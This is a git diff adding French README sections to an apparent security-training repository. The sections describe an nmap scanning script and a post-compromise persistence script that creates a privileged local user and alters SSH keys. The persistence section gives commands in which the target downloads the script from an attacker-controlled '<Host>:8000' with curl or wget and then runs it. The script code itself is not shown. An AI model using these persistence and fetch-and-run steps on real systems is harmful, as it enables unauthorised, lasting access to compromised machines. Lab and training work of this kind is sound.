@@ -39,3 +39,39 @@ Cependant, je vous ai montrer un exemple avec l'extraction d'un bureau ou des do
 Vous pouvez également mettre le chemin d'une clé USB/disque.
 
 
+## Script 2 - Scan nmap
+
+ Les scripts Nmap fournissent une fonctionnalité supplémentaire et permettent d'automatiser certaines tâches de découverte de réseau, d'analyse de sécurité et de collecte d'informations.
+ 
+ Usage : Lancer le script sur une machine Kali : https://github.com/NoorXmnr/Soc-project/blob/main/scan.sh
+ 
+ ![Cover](https://github.com/NoorXmnr/Soc-project/blob/main/image/Capture%20nmap.PNG)
+ 
+ ![Cover](https://github.com/NoorXmnr/Soc-project/blob/main/image/Capture%20nmap%20dossier%20implicaction.PNG)
+ 
+ 
+ 
+ ## Script 3 - Persistance
+ 
+ Ce script permet de maintenir l'accés au systéme compromis, méme si le système est redémarré ou si les informations d'identification sont modifiées.
+ Ce script inclut également la création de nouveaux comptes ou la sécurisation de l'accès via SSH.
+ 
+ # Fonctionalités
+ - Créer un utilisateur local
+ - Privilèges élevés
+ - Modifier les clés SSH
+ 
+ # Utilisation 
+ 
+ Depuis Github : https://github.com/NoorXmnr/Soc-project/blob/main/Cr%C3%A9ation%20d'utilisateurs%20avec%20privil%C3%A9ges.sh
+ 
+ Depuis le réseau local : 
+ # Host:
+sh persistence.sh -w
+# Target:
+curl -LJO <Host>:8000/persistence.sh #or
+curl <Host>:8000/persistence.sh > persistence.sh #or
+wget <Host>:8000/persistence.sh
+sh persistence.sh -h
+ 
+ 
